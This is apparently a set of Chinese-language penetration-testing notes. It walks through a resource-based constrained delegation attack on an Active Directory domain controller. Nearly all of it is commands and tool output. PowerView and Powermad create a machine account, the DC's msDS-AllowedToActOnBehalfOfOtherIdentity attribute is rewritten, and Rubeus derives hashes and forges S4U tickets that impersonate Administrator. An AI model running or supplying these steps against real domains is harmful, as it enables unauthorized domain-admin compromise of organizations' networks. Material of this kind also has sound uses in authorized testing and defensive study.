	用户发送一个 TGS 来访问服务（“服务 A”），如果允许该服务委托给另一个预定义服务（“服务 B”），那么服务 A 可以向身份验证服务提供该 TGS用户为服务 B 提供并获取用户的 TGS。
	导入Powermad和Powerview
	>PowerShell.exe -ExecutionPolicy Bypass
	>Import-Module .\powermad.ps1
	>Import-Module .\powerview.ps1
	获取用户 SID
	>$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
	>$ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
	>$ACE
	>ConvertFrom-SID $ACE.SecurityIdentifier
	利用MachineAccountQuota创建计算机帐户并为其设置 SPN
	New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)
	重写 DC 的AllowedToActOnBehalfOfOtherIdentity属性
	$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
	$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
	$SDBytes = New-Object byte[] ($SD.BinaryLength)
	$SD.GetBinaryForm($SDBytes, 0)
	Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
	$RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
	$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
	$Descriptor.DiscretionaryAcl

	$SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid
	$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

	StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND
	使用 Rubeus 从密码中获取哈希

	Rubeus.exe hash /password:'Weakest123*' /user:swktest$  /domain:factory.lan
	[*] Input password             : Weakest123*
	[*] Input username             : swktest$
	[*] Input domain               : factory.lan
	[*] Salt                       : FACTORY.LANswktest
	[*]       rc4_hmac             : F8E064CA98539B735600714A1F1907DD
	[*]       aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498
	[*]       aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347
	[*]       des_cbc_md5          : BA297CFD07E62A5E
	使用我们新创建的机器帐户模拟域管理员

	.\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
	.\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap

	[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'
	[*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
	[*] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan'
	[*] Sending S4U2proxy request
	[+] S4U2proxy success!
	[*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan':

	    doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD
	    AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE
	    LmZhY3RvcnkubGFu

	[*] Action: Import Ticket
	[+] Ticket successfully imported!